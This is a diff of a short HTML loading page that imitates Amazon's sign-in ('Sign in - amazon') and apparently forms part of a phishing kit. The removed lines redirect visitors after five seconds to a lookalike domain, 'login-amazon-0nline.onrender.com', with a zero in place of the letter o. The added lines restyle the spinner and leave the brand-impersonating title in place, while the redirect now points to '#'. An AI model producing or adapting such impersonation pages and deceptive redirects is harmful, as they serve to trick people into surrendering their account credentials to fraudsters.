@@ -1,78 +1,61 @@
 <!DOCTYPE html>
-<html><head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - amazon</title>
+    <link rel="shortcut icon" href="img/icon.png" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    <title>Amazon</title>
-    <link rel="shortcut icon" href="images/favicon.ico">
-    <link rel="stylesheet" href="style.css">
-</head>
-<style>
+        body, html {
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #ffffff;
+        }
 
-    .loader {
-      margin-top: 230px;
-      border: 6px solid #ffffff;
-      border-radius: 50%;
-      border-top: 6px solid #eec925;
-      border-left: 6px solid #eec925;
-      border-right: 6px solid #eec925;
-      width: 65px;
-      height: 65px;
-      -webkit-animation: spin 1s linear infinite; /* Safari */
-      animation: spin 1s linear infinite;
-    }
-    
-    
-    /* Safari */
-    @-webkit-keyframes spin {
-      0% { -webkit-transform: rotate(0deg); }
-      100% { -webkit-transform: rotate(360deg); }
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+        .loader {
+            border: 5px solid #CDCCC8;
+            border-radius: 50%;
+            border-top: 5px solid #e2c90a;
+            border-left: 5px solid #CDCCC8;
+            border-right: 5px solid #CDCCC8;
+            width: 60px;
+            height: 60px;
+            animation: spin 0.7s linear infinite;
+        }
 
-    @media (max-width: 977px) {
-      .loader {
-      margin-top: 450px;
-      border: 8px solid #ffffff;
-      border-radius: 50%;
-      border-top: 8px solid #eec925;
-      border-left: 8px solid #eec925;
-      border-right: 8px solid #eec925;
-      width: 60px;
-      height: 60px;
-      -webkit-animation: spin 1s linear infinite; /* Safari */
-      animation: spin 1s linear infinite;
-    }
-    }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-    
-    @media (max-width: 477px) {
-      .loader {
-      margin-top: 350px;
-      border: 8px solid #ffffff;
-      border-radius: 50%;
-      border-top: 8px solid #eec925;
-      border-left: 8px solid #eec925;
-      border-right: 8px solid #eec925;
-      width: 60px;
-      height: 60px;
-      -webkit-animation: spin 1s linear infinite; /* Safari */
-      animation: spin 1s linear infinite;
-    }
-    }
-    
+        /* For mobile responsiveness */
+        @media (max-width: 768px) {
+            .loader {
+                width: 60px;
+                height: 60px;
+            }
+        }
+
     </style>
-    
-    </head>
-    <body>
-    
-    <center><div class="loader"></div></center>
-    <meta http-equiv="refresh" content="5;url=https://login-amazon-0nline.onrender.com" />
-    
-    </body>
-    </html>
+</head>
+<body>
+
+<div class="loader"></div>
+
+<meta http-equiv="refresh" content="5;url=#" />
+
+</body>
+</html>
